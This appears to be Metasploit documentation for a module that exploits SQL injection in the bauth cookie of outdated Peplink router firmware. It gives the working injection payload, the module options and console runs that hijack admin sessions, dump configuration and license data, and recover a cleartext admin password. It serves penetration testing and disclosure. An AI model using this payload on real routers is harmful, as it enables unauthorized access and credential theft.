## Vulnerable Application

### Introduction

This module exploits an SQLi vulnerability in the web interface of Peplink
routers running outdated firmware (confirmed on version 7.0.0-build1904 and below).

The vulnerability is due to the lack of sanitization applied to the bauth cookie,
Successful exploitation of the vulnerability allows unauthenticated attackers to get
into sessions of legitimate users (bypassing authentication).

Exploitation of this vulnerability requires that there is at least one active user session
created in the last 4 hours (or session lifetime if it was modified).

## Verification Steps


## Options

### BypassLogin

If true, don't retrieve cookies, just use the SQL injection vulnerability to bypass the login
In the case where expired and non-expired admin sessions exist, might select the expired session if enabled.

### AdminOnly

Only attempt to retrieve cookies of privilegied users (admins)

### EnumPrivs

Retrieve the privilege associated with each session

### EnumUsernames

Retrieve the username associated with each session

### LimitTries

The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly

## Scenarios

Vulnerable firmware downloadable from [here](https://www.peplink.com/support/downloads/archive/).
It's possible to reproduce the vulnerability without owning a peplink router, using
[FusionHub](https://www.peplink.com/products/fusionhub/).
Refer to its installation guide, use a free Solo license.

### Firmware version 6.3.2

BypassLogin:

```
msf5 auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
msf5 auxiliary(gather/peplink_bauth_sqli) > run
[*] Running module against 192.168.1.254

[+] Target seems to be vulnerable
[*] Checking for admin cookie : ' or id IN (select s.id from sessions as s left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--
[+] Retrieved config, saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkconfigur_203870.bin
[*] Retrieving fhlicense_info
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkfhlicens_829403.txt
[*] Retrieving sysinfo
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinksysinfo_824042.txt
[*] Retrieving macinfo
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkmacinfo_992224.txt
[*] Retrieving hostnameinfo
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkhostname_183370.txt
[*] Retrieving uptime
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkuptime_523334.txt
[*] Retrieving client_info
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkclient_i_704361.txt
[*] Retrieving hubport
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkhubport_264378.txt
[*] Retrieving fhstroute
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkfhstrout_701714.txt
[*] Retrieving ipsec
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkipsec_664157.txt
[*] Retrieving wan_summary
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkwan_summ_936160.txt
[*] Retrieving firewall
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkfirewall_270172.txt
[*] Retrieving cert_info
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkcert_inf_201536.txt
[*] Retrieving mvpn_summary
[+] Saved at /home/redouane/.msf4/loot/20200802152344_default_192.168.1.254_peplinkmvpn_sum_261747.txt
[*] Auxiliary module execution completed
msf5 auxiliary(gather/peplink_bauth_sqli) >
```

The config is a .tar.gz archive with an added 36-byte header, you can extract the plaintext config:
```
$ dd if=20200802_fshhw1_1135E8A0DD29.conf of=config.tar.gz skip=36 bs=1
$ tar vxf config.tar.gz
```
The config usually includes the admin password in cleartext.
Note: it's also possible to upload a modified config.
```
$ cat config
ADMIN_HTTPS_ENABLE="yes"
ADMIN_HTTPS_LANONLY="no"
ADMIN_HTTPS_PORT="443"
ADMIN_HTTP_ENABLE="yes"
ADMIN_HTTP_TO_HTTPS="yes"
ADMIN_LANONLY="no"
ADMIN_NAME="admin"
ADMIN_PASSWORD="mySECUREpassword1"
ADMIN_PORT="80"
ADMIN_ROA_PASSWORD="user"
ADMIN_SESSION_TIMEOUT="14400"
CONFIG_VERSION="6.0"
DHCP_SERVER="enable"
FIREWALL_IDS="yes"
HOSTNAME="peplink"
IPSEC_NAT="yes"
LAN_CONN_METHOD="static"
LAN_IPADDR="192.168.1.254"
LAN_NETMASK="255.255.255.0"
LEFTTIME_USAGE="yes"
...
```

EnumPrivs and EnumUsernames:

```
msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumPrivs true 
EnumPrivs => true
msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumUsernames true 
EnumUsernames => true
msf5 auxiliary(sqli/peplink_bauth_sqli) > run 
[*] Running module against 192.168.1.254

[+] Target seems vulnerable
[*] There are 2 (possibly expired) sessions
[*] Trying the ids from the most recent login
[+] Found cookie wPJLPS6lqt8Ushwz1tlmz5tRbvI1ybwWRaBx2GRi3Qcu8, username = user, with read-only permissions
[+] Found cookie aLvFyqho3JYoYSc7EROYWU5A7c4pz9IwV66mvnIzYwMPr, username = admin, with read/write permissions
[*] Checking for admin cookie : wPJLPS6lqt8Ushwz1tlmz5tRbvI1ybwWRaBx2GRi3Qcu8
[*] Checking for admin cookie : aLvFyqho3JYoYSc7EROYWU5A7c4pz9IwV66mvnIzYwMPr

... <as above, gathering of data>

[*] Auxiliary module execution completed
msf5 auxiliary(sqli/peplink_bauth_sqli) > 
```

Verbose:

When you enable verbose, you get the parsed XML document displayed.

```
msf5 auxiliary(gather/peplink_bauth_sqli) > set Verbose true
msf5 auxiliary(gather/peplink_bauth_sqli) > set BypassLogin true
msf5 auxiliary(gather/peplink_bauth_sqli) > run
[*] Running module against 192.168.1.254

[+] Target seems to be vulnerable
[*] Checking for admin cookie : ' or id IN (select s.id from sessions as s left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--
[+] Retrieved config, saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkconfigur_780974.bin
[*] Retrieving fhlicense_info
[+]     data
[+]             license
[+]                     bandwidth
[+]                             0
[+]                     sessions
[+]                             0
[+]                     err_desc
[+]                             Virtual machine server changed.
[+]                     force_lic_page
[+]                             1
[+]                     activated
[+]                             0
[+]                     vm_server_address
[+]                     expired
[+]                             0
[+]                     license_type
[+]                             Invalid
[+]                     expiry_date
[+]                             2021-08-02
[+]                     sn
[+]                             1135-E8A0-DD29
[+]                     license_key
[+]                             YCB7EAN54FAEMTDF
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkfhlicens_867800.txt
[*] Retrieving sysinfo
[+]     data
[+]             sysinfo
[+]                     legal
[+]                     company
[+]                             Peplink
[+]                     mvpn_version
[+]                             5.0.0
[+]                     version
[+]                             6.3.2 build 1424
[+]                     serial
[+]                             1135-E8A0-DD29
[+]                     product_code
[+]                     hardware_revision
[+]                             1
[+]                     desc_support
[+]                     product_name
[+]                             Peplink FusionHub
[+]                     name
[+]                             1135-E8A0-DD29
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinksysinfo_739792.txt
[*] Retrieving macinfo
[+]     data
[+]             macinfo
[+]                     port {id=0}
[+]                             mac
[+]                                     08:00:27:52:8b:fc
[+]                             name
[+]                                     WAN 
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkmacinfo_307720.txt
[*] Retrieving hostnameinfo
[+]     data
[+]             hostname_info
[+]                     hostname
[+]                             1135-e8a0-dd29

[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkhostname_534719.txt
[*] Retrieving uptime
[+]     data
[+]             subscription_mode
[+]             systime
[+]                     Sun Aug 02 14:31:21 CET 2020
[+]             uptime
[+]                     elapsed
[+]                             2986
[+]                     info
[+]                             0 days 0 hours 49 minutes
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkuptime_233915.txt
[*] Retrieving client_info
[+]     data
[+]             client_status
[+]                     reserved_mac
[+]                     client_list
[+]                             client {type=0}
[+]                                     rate_down
[+]                                             0
[+]                                     rate_up
[+]                                             0
[+]                                     active
[+]                                     mac
[+]                                             10:08:B1:CC:97:41
[+]                                     ip {id=0}
[+]                                             192.168.1.222
[+]                                     ipn
[+]                                             3232235998
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkclient_i_419158.txt
[*] Retrieving hubport
[+]     data
[+]             port {id=wan}
[+]                     mvpn_advertise_wan_network
[+]                     tcpmss
[+]                     mtu
[+]                             1440
[+]                     pppoe_sn
[+]                     pppoe_password
[+]                     pppoe_user
[+]                     dns_custom_servers
[+]                             8.8.8.8 1.1.1.1
[+]                     dns_auto
[+]                     dhcp_hostname
[+]                     dhcp_client_id
[+]                     mvpn_default_to_lan
[+]                     gateway
[+]                             192.168.1.1
[+]                     netmask
[+]                             255.255.255.0
[+]                     ipaddr
[+]                             192.168.1.254
[+]                     bridge_mvpn
[+]                     bridge_mode
[+]                     conn_method
[+]                             static
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkhubport_064122.txt
[*] Retrieving fhstroute
[+]     data
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkfhstrout_739377.txt
[*] Retrieving ipsec
[+]     data
[+]             ipsec
[+]                     order
[+]                     nat
[+]             linkinfo
[+]                     link {id=1}
[+]                             port {id=1}
[+]                                     port_name
[+]                                             WAN
[+]                                     port_type
[+]                                             ethernet
[+]                                     actiavted
[+]                             name
[+]                                     WAN
[+]                             enable
[+]                     order
[+]                             1
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkipsec_320666.txt
[*] Retrieving wan_summary
[+]     data
[+]             connection_info
[+]                     conn {id=1}
[+]                             conn_method
[+]                                     method
[+]                                             dhcp
[+]                             modem_idle
[+]                                     timeout
[+]                                             180
[+]                             backup_group
[+]                                     0
[+]                             mvpn_nat
[+]                             nat
[+]                             enable
[+]                             port_id
[+]                                     1
[+]                             name
[+]                                     WAN
[+]                     order
[+]                             1
[+]             physical_info
[+]                     port {id=1}
[+]                             ethernet_info
[+]                                     simulated_mac
[+]                                     default_mac
[+]                                     mac_clone
[+]                                     mtu
[+]                                     advertise
[+]                                     speed
[+]                             port_name
[+]                                     WAN 
[+]                             type
[+]                                     ethernet
[+]                             activated
[+]                                     yes
[+]                     count
[+]                             1
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkwan_summ_918579.txt
[*] Retrieving firewall
[+]     data
[+]             firewall_ids
[+]             firewall_mvpn
[+]             private_firewall
[+]                     default
[+]                             accept
[+]             outbound_firewall
[+]                     default
[+]                             accept
[+]             inbound_firewall
[+]                     default
[+]                             accept
[+]             linkinfo
[+]                     link {id=1}
[+]                             port {id=1}
[+]                                     port_name
[+]                                             WAN
[+]                                     port_type
[+]                                             ethernet
[+]                                     actiavted
[+]                             name
[+]                                     WAN
[+]                             enable
[+]                     order
[+]                             1
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkfirewall_758402.txt
[*] Retrieving cert_info
[+]     data
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkcert_inf_603637.txt
[*] Retrieving mvpn_summary
[+]     data
[+]             mvpn
[+]                     order
[+]                     mvpn_nat_mode_dhcp_server
[+]                             has_nat_profile
[+]                                     0
[+]                             nat_remote
[+]                                     0
[+]                             subnet_mask
[+]                                     24
[+]                             pool_end
[+]                                     169.254.131.254
[+]                             pool_start
[+]                                     169.254.131.1
[+]                             enable
[+]                                     1
[+]                     restrict_advertise
[+]                             no
[+]                     hc_mode
[+]                             0
[+]                     rn
[+]                             1135-E8A0-DD29
[+]                     site_id
[+]                             333
[+]                     l2vpn
[+]                             wanport_supported
[+]                                     false
[+]                             wanport_name
[+]                                     WAN Port Unavailable
[+] Saved at /home/redouane/.msf4/loot/20200802153115_default_192.168.1.254_peplinkmvpn_sum_970830.txt
[*] Auxiliary module execution completed
msf5 auxiliary(gather/peplink_bauth_sqli) > 
```

Loot:

```
msf5 auxiliary(gather/peplink_bauth_sqli) > loot

Loot
====

host           service  type                          name  content             info  path
----           -------  ----                          ----  -------             ----  ----
192.168.1.254           peplink configuration tar gz        application/binary        /home/redouane/.msf4/loot/20200802153714_default_192.168.1.254_peplinkconfigur_157106.bin
192.168.1.254           peplink fhlicense_info              text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkfhlicens_326973.txt
192.168.1.254           peplink sysinfo                     text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinksysinfo_385353.txt
192.168.1.254           peplink macinfo                     text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkmacinfo_525407.txt
192.168.1.254           peplink hostnameinfo                text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkhostname_613045.txt
192.168.1.254           peplink uptime                      text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkuptime_488261.txt
192.168.1.254           peplink client_info                 text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkclient_i_529454.txt
192.168.1.254           peplink hubport                     text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkhubport_938262.txt
192.168.1.254           peplink fhstroute                   text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkfhstrout_737113.txt
192.168.1.254           peplink ipsec                       text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkipsec_055562.txt
192.168.1.254           peplink wan_summary                 text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkwan_summ_957693.txt
192.168.1.254           peplink firewall                    text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkfirewall_777226.txt
192.168.1.254           peplink cert_info                   text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkcert_inf_765605.txt
192.168.1.254           peplink mvpn_summary                text/xml                  /home/redouane/.msf4/loot/20200802153715_default_192.168.1.254_peplinkmvpn_sum_890141.txt

msf5 auxiliary(gather/peplink_bauth_sqli) > 

```
